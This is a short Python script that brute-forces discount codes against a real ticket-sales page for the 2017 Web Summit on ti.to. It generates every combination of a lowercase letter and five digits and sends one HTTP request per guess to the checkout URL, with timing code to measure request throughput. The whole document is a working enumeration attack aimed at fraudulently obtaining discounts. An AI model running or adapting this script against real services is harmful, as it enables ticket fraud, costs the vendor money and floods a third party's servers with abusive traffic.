import requests
import timeit
from itertools import combinations
import string
import urllib.request


counter=0

start = timeit.default_timer()


for x in combinations(string.ascii_uppercase,3) :

    up=(''.join(x))

    start = timeit.default_timer()


    for y in combinations(string.digits,5) :

        dig=(''.join(y))


        for z in string.ascii_lowercase :


            low=(''.join(z))

            stop = timeit.default_timer()


            urllib.request.urlopen("https://ti.to/websummit/2017-web-summit/with/ex-kawmslw4?discount_code="+low+dig+"&release_ids=ex-kawmslw4&ex-kawmslw4=1&source=")

            counter+=1

            print (counter)

            
            if counter==1000 :

                print ('1000 requests in : {}' .format(stop-start))